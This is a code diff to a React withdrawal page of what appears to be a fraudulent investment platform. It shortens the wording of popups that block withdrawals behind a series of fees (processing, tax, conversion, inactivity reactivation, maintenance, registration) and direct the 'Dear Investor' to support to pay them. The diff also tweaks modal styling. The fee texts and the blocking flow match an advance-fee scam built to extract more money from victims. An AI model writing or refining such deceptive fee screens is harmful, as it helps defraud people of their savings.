@@ -70,12 +70,12 @@ export default function Withdraw() {
   };
 
   const FEE_DESCRIPTIONS = {
-    processing: 'To complete your withdrawal, a one-time Processing Fee is required. This fee covers secure transaction verification, payment gateway charges, and the operational costs of routing your funds through our partner banking network. Once settled, your withdrawal will be released to your designated wallet within the standard processing window.',
-    tax: 'A mandatory Tax / Compliance Fee applies to this withdrawal in accordance with international financial regulations and applicable tax laws. This charge ensures your transaction is fully compliant with cross-border reporting requirements and protects your account from regulatory holds. Payment of this fee is required before funds can be released.',
-    conversion: 'An Asset Conversion Fee is required to convert your holdings between trading pairs or fiat currencies at the prevailing market rate. This covers liquidity provider costs, network fees, and exchange spread. Settling this fee ensures your funds are converted accurately and credited at the best available rate.',
-    inactivity: 'Your account has been flagged as inactive due to an extended period without trading or login activity. To reactivate full account access — including withdrawals, deposits, and platform features — a one-time Reactivation Fee is required. This fee covers account security re-verification and restoration of your trading privileges. Please contact support to complete reactivation.',
-    maintenance: 'An Account Maintenance Fee is required to keep your account in active standing. This fee covers continuous security monitoring, server infrastructure, regulatory compliance audits, and dedicated account support. Settling this fee ensures uninterrupted access to all platform services and protects your invested capital.',
-    registration: 'Your account requires a one-time Registration Fee to be fully activated. This unlocks complete access to withdrawals, premium trading features, and full investment capabilities. The Registration Fee verifies your identity with our partner institutions and ensures your account meets all regulatory standards for international fund transfers. Settling this fee is a final activation step required before withdrawals can be processed.',
+    processing: 'A one-time Processing Fee is required to securely complete your withdrawal, covering verification and payment gateway costs.',
+    tax: 'A mandatory Tax / Compliance Fee applies in line with international financial regulations and must be settled before funds can be released.',
+    conversion: 'An Asset Conversion Fee is required to convert your holdings at the prevailing market rate, covering liquidity and network costs.',
+    inactivity: 'Your account has been deactivated due to inactivity. A one-time Reactivation Fee is required to restore full access.',
+    maintenance: 'An Account Maintenance Fee is required to keep your account active and ensure uninterrupted platform access.',
+    registration: 'A one-time Registration Fee is required to fully activate your account and unlock withdrawals. This final activation step verifies your identity and meets regulatory standards.',
   };
 
   const fetchUserFees = async () => {
@@ -317,7 +317,7 @@ export default function Withdraw() {
       {showConfirm && (
         <>
           <div onClick={() => setShowConfirm(false)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 200 }} />
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 201, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: 'inherit' }}>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 201, background: 'white', padding: '24px 22px', width: '320px', maxHeight: '85vh', overflowY: 'auto', textAlign: 'center', borderRadius: '10px', fontFamily: 'inherit' }}>
             <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #6366f1', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
               <svg width='22' height='22' fill='none' stroke='#6366f1' viewBox='0 0 24 24' strokeWidth='2'><path strokeLinecap='round' strokeLinejoin='round' d='M5 10l7-7m0 0l7 7m-7-7v18'/></svg>
             </div>
@@ -336,7 +336,7 @@ export default function Withdraw() {
       {showSuccess && (
         <>
           <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 200 }} />
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 201, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: 'inherit' }}>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 201, background: 'white', padding: '24px 22px', width: '320px', maxHeight: '85vh', overflowY: 'auto', textAlign: 'center', borderRadius: '10px', fontFamily: 'inherit' }}>
             <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
               <svg width='22' height='22' fill='none' stroke='#22c55e' viewBox='0 0 24 24' strokeWidth='2'><path strokeLinecap='round' strokeLinejoin='round' d='M5 13l4 4L19 7'/></svg>
             </div>
@@ -451,7 +451,7 @@ export default function Withdraw() {
       {feePopup && (
         <>
           <div onClick={() => setFeePopup(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: 'inherit' }}>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '24px 22px', width: '320px', maxHeight: '85vh', overflowY: 'auto', textAlign: 'center', borderRadius: '10px', fontFamily: 'inherit' }}>
             <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
               <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
             </div>
@@ -461,7 +461,7 @@ export default function Withdraw() {
             <div style={{ color: '#ef4444', fontSize: '11px', fontWeight: '600', marginBottom: '12px' }}>
               {feePopup.type === 'inactivity' ? 'Inactivity Fee Required' : feePopup.type === 'registration' ? 'Withdrawal Not Available' : `${FEE_LABELS[feePopup.type] || feePopup.label} Not Settled`}
             </div>
-            <div style={{ color: '#555', fontSize: '11px', marginBottom: '14px', lineHeight: '1.7' }}>
+            <div style={{ color: '#555', fontSize: '11px', marginBottom: '14px', lineHeight: '1.55' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
             </div>
             {parseFloat(feePopup.amount || 0) > 0 && (
@@ -470,8 +470,8 @@ export default function Withdraw() {
                 <div style={{ color: '#ef4444', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(feePopup.amount).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
               </>
             )}
-            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
-              Dear Investor, you are currently unable to perform this action. Your withdrawal request cannot be processed until the required payment above is completed. Please contact support immediately to settle this fee and unlock your account.
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '18px', lineHeight: '1.55' }}>
+              Dear Investor, you cannot perform this action until the required payment is settled. Please contact support to proceed.
             </div>
             <button type="button" onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
               style={{ width: '100%', padding: '11px', background: '#6366f1', border: 'none', color: 'white', fontSize: '11px', fontWeight: '600', cursor: 'pointer', marginBottom: '8px' }}>
@@ -489,7 +489,7 @@ export default function Withdraw() {
       {feeSuccess && (
         <>
           <div onClick={() => setFeeSuccess(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px', fontFamily: 'inherit' }}>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '24px 22px', width: '320px', maxHeight: '85vh', overflowY: 'auto', textAlign: 'center', borderRadius: '10px', fontFamily: 'inherit' }}>
             {feeSuccess.allPaid ? (
               <>
                 <div style={{ width: '56px', height: '56px', borderRadius: '50%', background: 'rgba(34,197,94,0.1)', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
